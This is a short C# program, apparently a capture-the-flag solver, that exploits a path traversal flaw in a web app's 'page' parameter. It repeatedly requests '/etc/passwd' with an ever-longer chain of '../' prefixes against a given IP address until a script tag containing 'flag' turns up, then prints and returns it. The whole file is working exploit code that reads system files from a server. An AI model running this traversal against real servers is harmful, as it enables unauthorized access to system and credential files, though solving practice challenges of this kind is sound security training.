using System.Text.RegularExpressions;

namespace exploinator;

public static class Exploinator
{
	public static async Task<string> DoWork(string ipAddress)
	{

		var baseUrl = $"http://{ipAddress}/?page=/";
		var pageVar = "etc/passwd";

		while (true)
		{
			var url = baseUrl + pageVar;
			var response = await GetPageAsync(url);
			var scriptTags =
				Regex.Matches(response, @"<script\b[^>]*>[\s\S]*?<\/script>", RegexOptions.IgnoreCase);

			foreach (Match tag in scriptTags)
			{
				if (!tag.Value.Contains("flag")) continue;
				Console.WriteLine(tag.Value);
				return tag.Value;
			}

			pageVar = "../" + pageVar;
		}
	}
	
	private static async Task<string> GetPageAsync(string url)
	{
		using var client = new HttpClient();
		var response = await client.GetAsync(url);
		response.EnsureSuccessStatusCode();
		return await response.Content.ReadAsStringAsync();
	}
}